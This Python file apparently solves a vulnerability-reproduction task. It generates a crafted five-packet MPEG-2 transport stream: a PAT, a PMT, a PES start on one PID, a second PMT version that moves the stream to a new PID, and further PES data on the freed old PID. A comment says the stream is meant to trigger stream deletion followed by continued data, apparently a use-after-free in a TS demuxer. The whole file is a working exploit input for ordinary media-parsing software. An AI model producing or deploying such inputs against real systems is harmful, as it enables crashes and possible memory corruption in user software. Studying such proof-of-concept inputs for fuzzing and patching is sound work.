import os
import tarfile
from typing import List, Tuple


def _mpeg2_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    poly = 0x04C11DB7
    for b in data:
        crc ^= (b & 0xFF) << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) & 0xFFFFFFFF) ^ poly
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF


def _ts_header(pid: int, pusi: int, cc: int, afc: int = 1) -> bytes:
    pid &= 0x1FFF
    cc &= 0x0F
    afc &= 0x03
    b1 = 0x47
    b2 = ((pusi & 1) << 6) | ((pid >> 8) & 0x1F)
    b3 = pid & 0xFF
    b4 = (afc << 4) | cc
    return bytes((b1, b2, b3, b4))


def _ts_packet_payload_only(pid: int, pusi: int, cc: int, payload: bytes) -> bytes:
    if len(payload) > 184:
        payload = payload[:184]
    if len(payload) < 184:
        payload += b"\xFF" * (184 - len(payload))
    return _ts_header(pid, pusi, cc, afc=1) + payload


def _make_pat_section(pmt_pid: int, tsid: int = 1, version: int = 0, program_number: int = 1) -> bytes:
    program_info = bytes((
        (program_number >> 8) & 0xFF,
        program_number & 0xFF,
        0xE0 | ((pmt_pid >> 8) & 0x1F),
        pmt_pid & 0xFF,
    ))
    sec_len = 5 + len(program_info) + 4
    section = bytearray()
    section.append(0x00)  # table_id
    section.append(0xB0 | ((sec_len >> 8) & 0x0F))
    section.append(sec_len & 0xFF)
    section.append((tsid >> 8) & 0xFF)
    section.append(tsid & 0xFF)
    section.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    section.append(0x00)  # section_number
    section.append(0x00)  # last_section_number
    section += program_info
    crc = _mpeg2_crc32(bytes(section))
    section += crc.to_bytes(4, "big")
    return bytes(section)


def _make_pmt_section(
    pcr_pid: int,
    es_pid: int,
    program_number: int = 1,
    version: int = 0,
    stream_type: int = 0x1B,
) -> bytes:
    es_info = bytes((
        stream_type & 0xFF,
        0xE0 | ((es_pid >> 8) & 0x1F),
        es_pid & 0xFF,
        0xF0, 0x00,  # ES_info_length = 0
    ))
    sec_len = 9 + len(es_info) + 4
    section = bytearray()
    section.append(0x02)  # table_id
    section.append(0xB0 | ((sec_len >> 8) & 0x0F))
    section.append(sec_len & 0xFF)
    section.append((program_number >> 8) & 0xFF)
    section.append(program_number & 0xFF)
    section.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    section.append(0x00)  # section_number
    section.append(0x00)  # last_section_number
    section.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
    section.append(pcr_pid & 0xFF)
    section.append(0xF0)  # program_info_length high
    section.append(0x00)  # program_info_length low
    section += es_info
    crc = _mpeg2_crc32(bytes(section))
    section += crc.to_bytes(4, "big")
    return bytes(section)


def _psi_packet(pid: int, cc: int, section: bytes) -> bytes:
    payload = b"\x00" + section  # pointer_field = 0
    return _ts_packet_payload_only(pid, 1, cc, payload)


def _pes_start_packet(pid: int, cc: int, stream_id: int = 0xE0, pes_len: int = 0x01FF, fill_byte: int = 0x41) -> bytes:
    pes = bytearray()
    pes += b"\x00\x00\x01"
    pes.append(stream_id & 0xFF)
    pes.append((pes_len >> 8) & 0xFF)
    pes.append(pes_len & 0xFF)
    pes.append(0x80)  # '10' + flags
    pes.append(0x00)  # no PTS/DTS
    pes.append(0x00)  # header_data_length
    if len(pes) < 184:
        pes += bytes((fill_byte,)) * (184 - len(pes))
    return _ts_packet_payload_only(pid, 1, cc, bytes(pes))


def _pes_cont_packet(pid: int, cc: int, fill_byte: int = 0x42) -> bytes:
    payload = bytes((fill_byte,)) * 184
    return _ts_packet_payload_only(pid, 0, cc, payload)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Deterministic minimal TS designed to cause ES deletion followed by continued PES data on the freed PID.
        # 5 packets (940 bytes): PAT, PMT(v0 pid 0x0100), PES start on 0x0100, PMT(v1 pid 0x0101), PES continuation on 0x0100
        pmt_pid = 0x1000
        es_old = 0x0100
        es_new = 0x0101

        pat_sec = _make_pat_section(pmt_pid=pmt_pid, tsid=1, version=0, program_number=1)
        pmt1_sec = _make_pmt_section(pcr_pid=es_old, es_pid=es_old, program_number=1, version=0, stream_type=0x1B)
        pmt2_sec = _make_pmt_section(pcr_pid=es_new, es_pid=es_new, program_number=1, version=1, stream_type=0x1B)

        out = bytearray()
        out += _psi_packet(0x0000, 0, pat_sec)
        out += _psi_packet(pmt_pid, 0, pmt1_sec)
        out += _pes_start_packet(es_old, 0, stream_id=0xE0, pes_len=0x01FF, fill_byte=0x41)
        out += _psi_packet(pmt_pid, 1, pmt2_sec)
        out += _pes_cont_packet(es_old, 1, fill_byte=0x42)
        return bytes(out)